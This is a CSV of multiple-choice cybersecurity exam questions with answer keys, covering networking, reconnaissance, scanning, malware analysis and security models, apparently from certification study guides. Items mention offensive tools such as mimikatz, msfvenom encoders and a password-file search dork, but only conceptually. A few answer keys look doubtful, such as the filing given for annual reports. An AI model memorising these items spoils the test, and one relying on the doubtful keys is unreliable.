index,question,options,answer_key
10,The NIST Cybersecurity Framework identifies five core functions for managing cybersecurity risk. Which function involves developing and implementing activities to restore capabilities or services that were impaired due to a security incident?,"{'A': 'Identify', 'B': 'Protect', 'C': 'Detect', 'D': 'Recover'}",D
11,"What is the primary function of a ""dropper"" in the context of malware?","{'A': ""To encrypt the user's files for ransom."", 'B': 'To act as the initial stage of an infection, downloading and installing other malicious software.', 'C': 'To spread from one system to another without user intervention.', 'D': 'To capture keystrokes and banking information.'}",B
12,"In network scanning, what is the primary purpose of using the `-sV` flag with the nmap tool?","{'A': 'To perform a stealthy SYN scan.', 'B': 'To detect the version of the services running on open ports.', 'C': 'To scan for UDP services only.', 'D': 'To perform an operating system detection scan.'}",B
13,"According to the text, what is a key difference between static and dynamic malware analysis?","{'A': 'Static analysis involves running the malware in a sandbox, while dynamic analysis involves reading its code.', 'B': ""Static analysis examines the malware's code and properties without executing it, while dynamic analysis involves running it to observe its behavior."", 'C': 'Static analysis is only effective against viruses, while dynamic analysis is used for worms.', 'D': 'Static analysis requires a network connection, while dynamic analysis must be done offline.'}",B
14,What is a primary objective of a 'watering hole' attack?,"{'A': 'Sending a large number of phishing emails to a specific organization.', 'B': ""Leaving infected USB drives in a company's parking lot."", 'C': 'Compromising a legitimate website that is frequently visited by a target group to infect their systems.', 'D': 'Cloning a wireless access point to capture credentials.'}",C
15,The Bell-LaPadula security model is primarily concerned with enforcing which of the following security principles?,"{'A': 'Integrity, preventing unauthorized modification of data.', 'B': 'Availability, ensuring systems are accessible when needed.', 'C': 'Confidentiality, preventing the unauthorized disclosure of information.', 'D': 'Non-repudiation, ensuring a user cannot deny having sent a message.'}",C
16,"In the context of privilege escalation, what is the purpose of using the `unshadow` utility?","{'A': 'To reveal hidden files on a Windows system.', 'B': 'To decrypt passwords that have been hashed.', 'C': 'To combine the Linux `/etc/passwd` and `/etc/shadow` files into a single format for password cracking.', 'D': 'To find local vulnerabilities on a Windows system.'}",C
17,What was the critical weakness in the WEP (Wired Equivalent Privacy) protocol that allowed its encryption to be easily broken?,"{'A': 'It used a 40-bit key, which was too short for modern computers.', 'B': 'The initialization vector (IV) was not truly random, allowing the key to be determined.', 'C': 'It did not have a pre-shared key (PSK) mode.', 'D': 'The four-way handshake could be easily bypassed.'}",B
18,"A company rents a fully managed database system from a cloud provider, without having to manage the underlying servers or operating system. This is an example of which cloud service model?","{'A': 'Infrastructure as a Service (IaaS)', 'B': 'Software as a Service (SaaS)', 'C': 'Platform as a Service (PaaS)', 'D': 'Function as a Service (FaaS)'}",C
19,What is the primary purpose of using 'rainbow tables' in password cracking?,"{'A': 'To try every possible combination of characters for a given password length.', 'B': 'To use a dictionary of common words and apply mangling rules to them.', 'C': 'To speed up the cracking process by using precomputed hashes for plaintext passwords.', 'D': 'To exploit vulnerabilities in the password hashing algorithm itself.'}",C
20,"Which tool is specifically designed to enumerate information from LinkedIn, such as job listings and employee titles, based on a company name?","{'A': 'Nmap', 'B': 'Metasploit', 'C': 'Wpscan', 'D': 'InSpy'}",D
21,"In the context of post-exploitation, what is the primary function of the tool mimikatz?","{'A': 'To extract plaintext passwords, hashes, and Kerberos tickets from memory.', 'B': 'To create a persistent backdoor using the Windows Registry.', 'C': 'To scan the internal network for other vulnerable hosts.', 'D': ""To encrypt the victim's hard drive and demand a ransom.""}",A
22,"According to the history provided in the text, what is the relationship between the vulnerability scanners Nessus and OpenVAS?","{'A': 'Nessus is the open-source version of the commercial tool OpenVAS.', 'B': 'They were developed independently to compete with each other.', 'C': 'OpenVAS was forked from the last open-source version of Nessus.', 'D': 'OpenVAS is a plug-in that adds functionality to Nessus.'}",C
23,"Which open-source intelligence (OSINT) tool is specifically designed to find and gather information about internet-connected devices, such as webcams, industrial control systems, and IoT devices?","{'A': 'theHarvester', 'B': 'Shodan', 'C': 'Maltego', 'D': 'EDGAR'}",B
24,What is the main objective of a slowloris attack?,"{'A': ""To overwhelm the network's bandwidth with a high volume of traffic."", 'B': 'To exploit a buffer overflow vulnerability in the HTTP protocol handler.', 'C': 'To amplify DNS query responses to reflect a massive amount of traffic at a target.', 'D': ""To exhaust the web server's maximum concurrent connection pool by sending incomplete HTTP requests slowly.""}",D
25,"The Bell-LaPadula model is a security model focused on enforcing confidentiality. What is its fundamental principle, often summarized as a rule for subjects accessing objects?","{'A': 'No read up, no write down.', 'B': 'No read down, no write up.', 'C': 'All access must be mediated through a trusted program.', 'D': 'Transitions must only occur between secure states.'}",A
26,Which of the following activities is a core component of static malware analysis?,"{'A': 'Running the malware in a sandboxed environment to observe its network traffic.', 'B': ""Using a debugger to step through the program's execution one instruction at a time."", 'C': 'Monitoring changes to the file system and registry after the malware has been executed.', 'D': 'Disassembling the executable and examining its code without running it.'}",D
27,The tool sslstrip is used in a man-in-the-middle attack. What is its primary function?,"{'A': 'To intercept HTTPS traffic and downgrade it to HTTP, allowing the attacker to read the plaintext data.', 'B': 'To brute-force the RSA private key used in a TLS handshake.', 'C': 'To inject malicious JavaScript into an unencrypted HTTP session.', 'D': 'To capture and replay the WPA2 four-way handshake to crack the Wi-Fi password.'}",A
28,"Within the OSI communications model, which layer is responsible for logical addressing (e.g., IP addresses) and determining the best path for data to travel between networks (routing)?","{'A': 'Data Link Layer (Layer 2)', 'B': 'Transport Layer (Layer 4)', 'C': 'Network Layer (Layer 3)', 'D': 'Application Layer (Layer 7)'}",C
29,What is the primary goal of a bluesnarfing attack?,"{'A': 'To send unsolicited messages or vCards to a Bluetooth device.', 'B': ""To gain unauthorized access to data on a Bluetooth-enabled device without the owner's knowledge."", 'C': 'To remotely control a Bluetooth device, such as making it place a phone call.', 'D': 'To create a rogue access point that mimics a legitimate Bluetooth peripheral.'}",B
30,"In cryptography, what is a 'collision' in the context of a hash function?","{'A': 'When a hash function fails to produce an output due to invalid input.', 'B': 'When the original input can be easily derived from the hash output.', 'C': 'When a hash output is longer than the specified length for the algorithm.', 'D': 'When two different inputs produce the exact same hash output.'}",D
31,What is the primary function of the tool 'theHarvester' as described in the study guide?,"{'A': 'To search through various sources to locate contact information like email addresses based on a domain name.', 'B': 'To perform a port scan on all hosts associated with a domain.', 'C': 'To clone an entire website for offline analysis.', 'D': 'To perform a brute-force attack against DNS to find all hostnames.'}",A
32,"What is a key characteristic of an Nmap SYN scan (-sS), also known as a 'half-open' scan?","{'A': 'It can only be used to scan UDP ports.', 'B': 'It is less stealthy than a full connect scan.', 'C': 'It requires root privileges on the target machine to function.', 'D': 'It does not complete the full three-way TCP handshake.'}",D
33,"In malware analysis, what is the fundamental difference between static and dynamic analysis?","{'A': ""Static analysis involves examining the malware's code and properties without executing it, while dynamic analysis involves running the malware in a controlled environment to observe its behavior."", 'B': 'Static analysis can only be performed on Windows systems, while dynamic analysis is for Linux systems.', 'C': 'Static analysis focuses on network traffic, while dynamic analysis focuses on file system changes.', 'D': 'Static analysis is an outdated technique, while dynamic analysis is the modern standard.'}",A
34,Which social engineering vector uses phone calls to deceive a target and acquire sensitive information?,"{'A': 'Phishing', 'B': 'Smishing', 'C': 'Vishing', 'D': 'Baiting'}",C
35,What was the primary cryptographic weakness in the Wired Equivalent Privacy (WEP) protocol that allowed it to be cracked?,"{'A': 'It used a 4096-bit key which was too complex for older hardware.', 'B': 'It did not support pre-shared keys (PSK).', 'C': 'The 24-bit initialization vector (IV) was too small and not implemented randomly, leading to key reuse.', 'D': 'It was vulnerable to the KRACK (Key Reinstallation Attack).'}",C
36,How does a 'slowloris' attack cause a denial of service?,"{'A': ""By sending a large volume of UDP packets to saturate the target's network bandwidth."", 'B': 'By sending incomplete HTTP requests to tie up all available connections on a web server, preventing it from serving legitimate users.', 'C': ""By sending fragmented IP packets that overlap, causing the target's OS to crash."", 'D': 'By sending a SYN packet with a spoofed source address to the target.'}",B
37,What is the primary purpose of using a cryptographic hash function like MD5 or SHA-1 on a file or message?,"{'A': 'To encrypt the data so that it cannot be read by unauthorized parties.', 'B': 'To compress the data to a smaller size for efficient storage.', 'C': 'To prove the identity of the sender.', 'D': 'To verify the integrity of the data, ensuring it has not been altered.'}",D
38,What is the primary difference in focus between the Biba and the Bell-LaPadula security models?,"{'A': 'The Biba model focuses on data integrity, while the Bell-LaPadula model focuses on data confidentiality.', 'B': 'The Biba model focuses on availability, while the Bell-LaPadula model focuses on integrity.', 'C': 'The Biba model is a state machine model, while the Bell-LaPadula model is not.', 'D': 'The Biba model applies to commercial systems, while Bell-LaPadula is only for academic use.'}",A
39,"In the OSI model, which layer is responsible for segmenting messages, providing port addressing for applications (e.g., TCP and UDP), and managing end-to-end connections?","{'A': 'Layer 2 (Data Link)', 'B': 'Layer 4 (Transport)', 'C': 'Layer 3 (Network)', 'D': 'Layer 7 (Application)'}",B
40,"In the context of post-exploitation, what does the term 'pivoting' refer to?","{'A': 'Increasing user privileges from a standard user to an administrator on the compromised system.', 'B': ""Erasing logs and hiding files to cover the attacker's tracks on the compromised system."", 'C': 'Installing a backdoor to ensure future access to the compromised system.', 'D': 'Using a compromised system as a gateway to gain access to other systems or networks that were not directly accessible.'}",D
41,What is the primary function of the `nbtstat -a <hostname>` command on a Windows system for enumeration?,"{'A': 'To list all active TCP connections and listening ports on the local machine.', 'B': 'To display the NetBIOS remote machine name table, showing registered names and services for a specific host.', 'C': 'To perform a brute-force password attack against the SMB service.', 'D': 'To transfer files to and from the remote machine using NetBIOS.'}",B
42,"In the context of system hacking, what is the goal of a 'privilege escalation' attack?","{'A': 'To move laterally from one compromised machine to another.', 'B': 'To gain a higher level of permissions, such as root or administrator, from a normal user account.', 'C': 'To create a persistent backdoor that survives a system reboot.', 'D': 'To erase logs and cover the tracks of the initial intrusion.'}",B
43,"Which of the following malware analysis techniques involves running the malware in a controlled environment, like a sandbox or VM, to observe its behavior?","{'A': 'Static Analysis', 'B': 'Disassembly', 'C': 'Dynamic Analysis', 'D': 'Hash Analysis'}",C
44,What is the primary purpose of using an encoder like `x86/shikata_ga_nai` when creating a payload with msfvenom?,"{'A': 'To compress the payload to a smaller size for faster transmission.', 'B': 'To translate the payload into a different programming language.', 'C': 'To add new functionality, such as keylogging, to the payload.', 'D': ""To obscure the payload's signature and evade detection by antivirus programs.""}",D
45,"An attacker uses a tool to send a large number of specially crafted TCP packets with the FIN, PSH, and URG flags set. What type of scan is this?","{'A': 'SYN Scan', 'B': 'XMAS Scan', 'C': 'Full Connect Scan', 'D': 'Null Scan'}",B
46,"Which tool described in the text can be used to perform a deauthentication attack, forcing wireless clients to disconnect and reauthenticate?","{'A': 'tcpdump', 'B': 'Ettercap', 'C': 'aireplay-ng', 'D': 'wifiphisher'}",C
47,A 'watering hole' attack is a form of social engineering where an attacker does what?,"{'A': 'Sends phishing emails to a large number of random targets.', 'B': 'Leaves infected USB drives in a public place for victims to find.', 'C': 'Compromises a legitimate website that is frequently visited by a specific target group.', 'D': 'Clones an RFID badge to gain physical access to a building.'}",C
48,What is the main function of the Biba Integrity Model in security architecture?,"{'A': 'To ensure confidentiality by preventing subjects from reading data at a higher security level.', 'B': ""To ensure data integrity with rules such as 'no read down' and 'no write up'."", 'C': 'To model all possible states of a system to detect transitions to an insecure state.', 'D': 'To manage discretionary access control through user-defined permissions.'}",B
49,"Which type of firewall is designed to inspect the payload of packets and make decisions based on application-layer protocols, such as a Web Application Firewall (WAF)?","{'A': 'Packet Filter', 'B': 'Stateful Firewall', 'C': 'Application Layer Firewall', 'D': 'Circuit-Level Gateway'}",C
50,Which phase of the attack life cycle involves an attacker gaining access to more systems within the network after the initial compromise?,"{'A': 'Initial Reconnaissance', 'B': 'Establish Foothold', 'C': 'Move Laterally', 'D': 'Complete Mission'}",C
0,Which of these devices would not be considered part of the Internet of Things?,"{'A': 'Smartphone', 'B': 'Thermostat', 'C': 'Light bulb', 'D': 'Set-top cable box'}",A
1,"If you wanted a lightweight protocol to send real-time data over, which of these would you use?","{'A': 'TCP', 'B': 'HTTP', 'C': 'ICMP', 'D': 'UDP'}",D
2,"What order, from bottom to top, does the TCP/IP architecture use?","{'A': 'Network Access, Network, Transport, Application', 'B': 'Link, Internet, Transport, Application', 'C': 'Physical, Network, Session, Application', 'D': 'Data Link, Internet, Transport, Application'}",B
3,Which of these services would be considered a storage as a service solution?,"{'A': 'Microsoft Azure', 'B': 'iCloud', 'C': 'Google Compute', 'D': 'DropLeaf'}",B
4,The UDP headers contain which of the following fields?,"{'A': 'Source address, destination address, checksum, length', 'B': 'Destination port, source port, checksum, length', 'C': 'Flags, source port, destination port, checksum', 'D': 'Length, checksum, flags, address'}",B
5,What are the three steps in the TCP handshake as described by the flags set?,"{'A': 'SYN, SYN/URG, RST', 'B': 'RST, SYN, ACK', 'C': 'SYN, SYN/ACK, ACK', 'D': 'SYN, SYN/ACK, ACK/URG'}",C
6,Which of these protocols would be used to communicate with an IoT device?,"{'A': 'ICMP', 'B': 'SMTP', 'C': 'Telnet', 'D': 'HTTP'}",D
7,Which network topology are you most likely to run across in a large enterprise network?,"{'A': 'Ring topology', 'B': 'Bus topology', 'C': 'Full mesh', 'D': 'Star-bus hybrid'}",D
8,"If you were to see the subnet mask 255.255.252.0, what CIDR notation (prefix) would you use to indicate the same thing?","{'A': '/23', 'B': '/22', 'C': '/21', 'D': '/20'}",B
9,Which of these addresses would be considered a private address (RFC 1918 address)?,"{'A': '172.128.10.5', 'B': '9.10.10.7', 'C': '172.20.128.240', 'D': '250.28.17.10'}",C
10,"If you were looking for the definitive documentation on a protocol, what would you consult?","{'A': 'Request for Comments', 'B': 'Manual pages', 'C': 'Standards', 'D': 'IEEE'}",A
11,The PDU for TCP is called a __________.,"{'A': 'Packet', 'B': 'Datagram', 'C': 'Frame', 'D': 'Segment'}",D
12,Which header field is used to reassemble fragmented IP packets?,"{'A': 'Source address', 'B': 'IP identification', 'C': 'Donâ€™t fragment bit', 'D': 'Acknowledgment field'}",B
13,Which protocol is necessary to enable the functionality of traceroute?,"{'A': 'HTTP', 'B': 'SNMP', 'C': 'ICMP', 'D': 'IP'}",C
14,What is a MAC address used for?,"{'A': 'Addressing systems over a VPN', 'B': 'Addressing systems through a tunnel', 'C': 'Addressing systems over TCP', 'D': 'Addressing systems on the local network'}",D
15,"To remove malware from the network before it gets to the endpoint, you would use which of the following?","{'A': 'Packet filter', 'B': 'Application layer gateway', 'C': 'Unified threat management appliance', 'D': 'Stateful firewall'}",C
16,"If you were on a client engagement and discovered that you left an external hard drive with essential data on it at home, which security principle would you be violating?","{'A': 'Confidentiality', 'B': 'Integrity', 'C': 'Non-repudiation', 'D': 'Availability'}",D
17,How would you calculate risk?,"{'A': 'Probability * loss value', 'B': 'Probability * mitigation factor', 'C': '(Loss value + mitigation factor) * (loss value/probability)', 'D': 'Probability * mitigation factor'}",A
18,Which of the following is one factor of a defense in depth approach to network design?,"{'A': 'Switches', 'B': 'Using Linux on the desktop', 'C': 'Optical cable connections', 'D': 'Access control lists on routers'}",D
19,How would you ensure that confidentiality is implemented in an organization?,"{'A': 'Watchdog processes', 'B': 'Encryption', 'C': 'Cryptographic hashes', 'D': 'Web servers'}",B
20,An intrusion detection system can perform which of the following functions?,"{'A': 'Block traffic', 'B': 'Filter traffic based on headers', 'C': 'Generate alerts on traffic', 'D': 'Log system messages'}",C
21,Which of these would be an example of a loss of integrity?,"{'A': 'User making changes to a file and saving it', 'B': 'Bad blocks flagged on disk', 'C': 'Credit cards passed in cleartext', 'D': 'Memory failures causing disk drivers to run incorrectly'}",D
22,What would you use a security information event manager for?,"{'A': 'Aggregating and providing search for log data', 'B': 'Managing security projects', 'C': 'Escalating security events', 'D': 'Storing open-source intelligence'}",A
23,Why is it important to store system logs remotely?,"{'A': 'Local systems canâ€™t handle it.', 'B': 'Bandwidth is faster than disks.', 'C': 'Attackers might delete local logs.', 'D': 'It will defend against attacks.'}",C
24,What would be necessary for a TCP conversation to be considered ESTABLISHED by a stateful firewall?,"{'A': 'Final acknowledgment message', 'B': 'Three-way handshake complete', 'C': 'Sequence numbers aligned', 'D': 'SYN message received'}",B
25,What is the purpose of a security policy?,"{'A': 'To provide high-level guidance on the role of security', 'B': 'To provide specific direction to security workers', 'C': 'To increase the bottom line of a company', 'D': 'To align standards and practices'}",A
26,What additional properties does the Parkerian hexad offer over the CIA triad?,"{'A': 'Confidentiality, awareness, authenticity', 'B': 'Utility, awareness, possession', 'C': 'Utility, possession, authenticity', 'D': 'Possession, control, authenticity'}",C
27,What important event can be exposed by enabling auditing?,"{'A': 'System shutdown', 'B': 'Service startup', 'C': 'Package installation', 'D': 'User login'}",D
28,What can an intrusion prevention system do that an intrusion detection system canâ€™t?,"{'A': 'Generate alerts', 'B': 'Block or reject network traffic', 'C': 'Complete the three-way handshake to bogus messages', 'D': 'Log packets'}",B
29,Which of these is an example of an application layer gateway?,"{'A': 'Web application firewall', 'B': 'Runtime application self-protection', 'C': 'Java applet', 'D': 'Intrusion prevention system'}",A
30,Which information would a packet filter use to make decisions about what traffic to allow into the network?,"{'A': 'HTTP REQUEST message', 'B': 'Ethernet type', 'C': 'UDP source port', 'D': 'SNMP OID'}",C
31,Which of the following products might be used as an intrusion detection system?,"{'A': 'Elastic Stack', 'B': 'Prewikka', 'C': 'Snort', 'D': 'Snorby'}",C
32,Which of these isnâ€™t an example of an attack that compromises integrity?,"{'A': 'Buffer overflow', 'B': 'Man in the middle', 'C': 'Heap spraying', 'D': 'Watering hole'}",D
33,What type of attack is a compromise of availability?,"{'A': 'Watering hole', 'B': 'DoS', 'C': 'Phishing', 'D': 'Buffer overflow'}",B
34,"If you were implementing defense in breadth, what might you do?","{'A': 'Install multiple firewalls', 'B': 'Install intrusion detection systems', 'C': 'Introduce a DevSecOps culture', 'D': 'Ensure policies are up to date'}",C
35,"If you were checking on the IP addresses for a company in France, what RIR would you be checking with for details?","{'A': 'ARIN', 'B': 'RIPE', 'C': 'AfriNIC', 'D': 'LACNIC'}",B
36,"You need to identify all Excel spreadsheets available from the company Example, Inc., whose domain is example.com. What search query would you use?","{'A': 'site:example.com files:pdf', 'B': 'site:excel files:xls', 'C': 'domain:example.com filetype:xls', 'D': 'site:example.com filetype:xls'}",D
37,"If you found a colleague searching at pgp.mit.edu, what would they likely be looking for?","{'A': 'Email addresses', 'B': 'Company keys', 'C': 'Executive names', 'D': 'Privacy policies'}",A
38,What information could you get from running p0f?,"{'A': 'Local time', 'B': 'Remote time', 'C': 'Absolute time', 'D': 'Uptime'}",D
39,The DNS server where records for a domain belonging to an organization or enterprise reside is called the ________ server.,"{'A': 'Caching', 'B': 'Recursive', 'C': 'Authoritative', 'D': 'Local'}",C
40,"What strategy does a local, caching DNS server use to look up records when asked?","{'A': 'Recursive', 'B': 'Serial', 'C': 'Combinatorics', 'D': 'Bistromathics'}",A
41,What would you use a job listing for when performing reconnaissance?,"{'A': 'Executive staff', 'B': 'Technologies used', 'C': 'Phishing targets', 'D': 'Financial records'}",B
42,"What tool could be used to gather email addresses from PGP servers: Bing, Google, or LinkedIn?","{'A': 'whois', 'B': 'dig', 'C': 'netstat', 'D': 'theHarvester'}",D
43,"What social networking site would be most likely to be useful in gathering information about a company, including job titles?","{'A': 'Twitter', 'B': 'LinkedIn', 'C': 'Foursquare', 'D': 'Facebook'}",B
44,You see the following text written downâ€”port:502. What does that likely reference?,"{'A': 'Shodan search', 'B': 'IO search', 'C': 'p0f results', 'D': 'RIR query'}",A
45,What would you use Wappalyzer for?,"{'A': 'Analyzing web headers', 'B': 'Analyzing application code', 'C': 'Identifying web headers', 'D': 'Identifying web technologies'}",D
46,What technique would you ideally use to get all of the hostnames associated with a domain?,"{'A': 'DNS query', 'B': 'Zone copy', 'C': 'Zone transfer', 'D': 'Recursive request'}",C
47,What information would you not expect to find in the response to a whois query about an IP address?,"{'A': 'IP address block', 'B': 'Domain association', 'C': 'Address block owner', 'D': 'Technical contact'}",B
48,What would you be looking for with the following Google query? filetype:txt Administrator:500:,"{'A': 'Text files owned by Administrator', 'B': 'Administrator login from file', 'C': 'Text files including the text Administrator:500:', 'D': '500 administrator files with text'}",C
49,What command would you use to get the list of mail servers for a domain?,"{'A': 'whois mx zone=domain.com', 'B': 'netstat zone=domain.com mx', 'C': 'dig domain.com @mx', 'D': 'dig mx domain.com'}",D
50,What would you get from running the command dig ns domain.com?,"{'A': 'Mail exchanger records for domain.com', 'B': 'Name server records for domain.com', 'C': 'Caching name server for domain.com', 'D': 'IP address for the hostname ns'}",B
51,"If you wanted to locate detailed information about a person using either their name or a username you have, which website would you use?","{'A': 'peekyou.com', 'B': 'twitter.com', 'C': 'intelius.com', 'D': 'facebook.com'}",A
52,"If you were looking for detailed financial information on a target company, with what resource would you have the most success?","{'A': 'LinkedIn', 'B': 'Facebook', 'C': 'EDGAR', 'D': 'MORTIMER'}",C
53,What financial filing is required for public companies and would provide you with the annual report?,"{'A': '10-Q', 'B': '11-K', 'C': '401(k)', 'D': '14-A'}",D
54,"If you were looking up information about a company in New Zealand, which RIR would you be looking in for data?","{'A': 'AfriNIC', 'B': 'RIPE', 'C': 'APNIC', 'D': 'LACNIC'}",C
55,"If you receive a RST packet back from a target host, what do you know about your target?","{'A': 'The target is using UDP rather than TCP.', 'B': 'The destination port is open on the target host.', 'C': 'The source port in the RST message is closed.', 'D': 'The target expects the PSH flag to be set.'}",C
56,What is the difference between a SYN scan and a full connect scan?,"{'A': 'A SYN scan and a full connect scan are the same.', 'B': 'A full connect scan sends an ACK message first.', 'C': 'A SYN scan uses the PSH flag with the SYN flag.', 'D': 'The SYN scan doesnâ€™t complete the three-way handshake.'}",D
57,What is one reason a UDP scan may take longer than a TCP scan of the same host?,"{'A': 'UDP will retransmit more.', 'B': 'UDP has more ports to scan.', 'C': 'UDP is a slower protocol.', 'D': 'UDP requires more messages to set up.'}",A
58,Why does an ACK scan not indicate clearly that ports are open?,"{'A': 'The scanner has to guess.', 'B': 'ACK is not a supported flag.', 'C': 'The target system ignores the message.', 'D': 'ACK scans cause a lot of retransmits.'}",C
59,What is one reason for using a scan like an ACK scan?,"{'A': 'It may get through firewalls and IDS devices.', 'B': 'It is better supported.', 'C': 'The code in nmap is more robust.', 'D': 'An ACK scan is needed for scripting support.'}",A
60,What does nmap look at for fingerprinting an operating system?,"{'A': 'The operating system headers', 'B': 'The application version', 'C': 'The response from connecting to port 0', 'D': 'The IP ID field and the initial sequence number'}",D
61,What is nmap looking at when it conducts a version scan?,"{'A': 'TCP and IP headers', 'B': 'Application banners', 'C': 'Operating system kernel', 'D': 'IP ID and TCP sequence number fields'}",B
62,What is an advantage of using masscan over nmap?,"{'A': 'masscan has been around longer.', 'B': 'Nmap is hard to use.', 'C': 'masscan can scan more addresses faster.', 'D': 'masscan has access to scan more of the Internet.'}",C
63,"If you were to see the following command run, what would you assume? hping -S -p 25 10.5.16.2","{'A': 'Someone was trying to probe the web port of the target.', 'B': 'Someone was trying to probe an email port on the target.', 'C': 'Someone was trying to identify if SNMP was supported on 10.5.16.2.', 'D': 'Someone had mistyped ping.'}",B
64,"If you were to see that someone was using OpenVAS, followed by Nessus, what might you assume?","{'A': 'They were trying to break into a system.', 'B': 'They didnâ€™t know how to use Nessus.', 'C': 'They didnâ€™t know how to use OpenVAS.', 'D': 'They were trying to reduce false positives.'}",D
65,What is the difference between a false positive and a false negative?,"{'A': 'A false positive indicates a finding that doesnâ€™t exist, while a false negative doesnâ€™t indicate a finding that does exist.', 'B': 'A false positive indicates a finding that does exist, while a false negative doesnâ€™t indicate a finding that doesnâ€™t exist.', 'C': 'A false positive doesnâ€™t indicate a finding that does exist, while a false negative does indicate a finding that doesnâ€™t exist.', 'D': 'A false negative does indicate a finding that doesnâ€™t exist, while a false positive doesnâ€™t indicate a finding that does exist.'}",A
66,What would be the purpose of running a ping sweep?,"{'A': 'You want to identify responsive hosts without a port scan.', 'B': 'You want to use something that is light on network traffic.', 'C': 'You want to use a protocol that may be allowed through the firewall.', 'D': 'All of the above.'}",D
67,Which of these may be considered worst practice when it comes to vulnerability scans?,"{'A': 'Scanning production servers', 'B': 'Notifying operations staff ahead of time', 'C': 'Taking no action on the results', 'D': 'Using limited details in your scan reports'}",C
68,Which of these may be considered an evasive technique?,"{'A': 'Scanning nonstandard ports', 'B': 'Encoding data', 'C': 'Using a proxy server', 'D': 'Using nmap in blind mode'}",B
69,"If you were to notice operating system commands inside a DNS request while looking at a packet capture, what might you be looking at?","{'A': 'Tunneling attack', 'B': 'DNS amplification', 'C': 'DNS recursion', 'D': 'XML entity injection'}",A
70,What is an XMAS scan?,"{'A': 'TCP scan with SYN/ACK/FIN set', 'B': 'UDP scan with FIN/PSH set', 'C': 'TCP scan with FIN/PSH/URG set', 'D': 'UDP scan SYN/URG/FIN set'}",C
71,What would you use MegaPing for?,"{'A': 'Running exploits', 'B': 'Running a port scan', 'C': 'Issuing manual web requests', 'D': 'Crafting packets'}",B
72,What would be a reason to use the Override feature in OpenVAS?,"{'A': 'You want to run a different plug-in for a vulnerability.', 'B': 'You want to change the scanner settings.', 'C': 'You want to use TCP rather than UDP.', 'D': 'You want to change a severity rating on a finding.'}",D
73,What would you use credentials for in a vulnerability scanner?,"{'A': 'Better reliability in network findings', 'B': 'Authenticating through VPNs for scans', 'C': 'Scanning for local vulnerabilities', 'D': 'Running an Active Directory scan'}",C
